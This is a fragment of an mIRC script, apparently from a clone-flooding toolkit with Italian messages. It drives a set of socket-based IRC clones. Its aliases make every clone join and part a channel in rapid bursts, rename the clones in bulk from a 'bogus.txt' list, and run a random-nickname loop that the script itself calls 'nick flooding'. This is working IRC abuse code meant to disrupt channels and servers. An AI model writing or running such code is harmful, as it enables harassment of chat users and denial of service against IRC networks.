n340=alias jp { .skwinchk | .aline  @fwclones [join/part/join $1 $+ ] | .enable #socketignore | .timer 1 15 .disable #socketignore | sockwrite -n fw* JOIN $1 | sockwrite -n fw* PART $1 : $+ %logo | sockwrite -n fw* JOIN $1 | sockwrite -n fw* PART $1 : $+ %logo | sockwrite -n fw* JOIN $1 }
n341=alias sockstat { .skwinchk | .aline  @fwclones [stato socket cloni] | set %socks $sock(*,0) | :loop | if (%socks > 0) { .aline  @fwclones [ $+ $sock(fw*,%socks).name : inviati( $+ $sock(*,%socks).sent $+ b):ricevuti( $+ $sock(fw*,%socks).rcvd $+ b) : coda invio( $+ $sock(*,%socks).sq $+ b):coda ricezione( $+ $sock(fw*,%socks).rq $+ b) : ultimo invio( $+ $sock(fw*,%socks).ls $+ ):ultima ricezione( $+ $sock(fw*,%socks).lr $+ ) : mark( $+ $sock(fw*,%socks).mark $+ )] | dec %socks | goto loop } }
n342=alias clonereset { .skwinchk | .aline  @fwclones [nick cloni reimpostati] | set %socks $sock(*,0) | :loop | if (%socks > 0) { %arf = % +$ fw.colnick $+ [ [ %socks ] ] | .sockwrite -n $sock(*,%socks).name NICK x[ $+ %socks $+ ]x | dec %socks | goto loop } }
n343=alias fw.setnick { .skwinchk | set %socks $sock(fw*,0) | :loop | if (%socks > 0) { %arf = % +$ fw.colnick $+ [ [ %socks ] ] | .sockwrite -n $sock(fw*,%socks).name NICK $$1 $+ %socks | dec %socks | goto loop } }
n344=alias fw.nicklist { .skwinchk
n345=  set %socks $sock(fw*,0)
n346=  :loop
n347=  if (%socks > 0) {
n348=    %arf = % +$ fw.colnick $+ [ [ %socks ] ]
n349=    .sockwrite -n $sock(fw*,%socks).name NICK $read $mircdirdati\bogus.txt
n350=    dec %socks
n351=    goto loop
n352=  }
n353=}
n354=alias fw.nickflood { .skwinchk | .enable #socketignore | .timer 1 15 .disable #socketignore | .aline  @fwclones [nick flooding] | set %socks $sock(fw*,0) | :loop | if (%socks > 0) { %arf = % +$ fw.colnick $+ [ [ %socks ] ] | .sockwrite -n $sock(fw*,%socks).name NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(A,Z) | dec %socks | goto loop } }
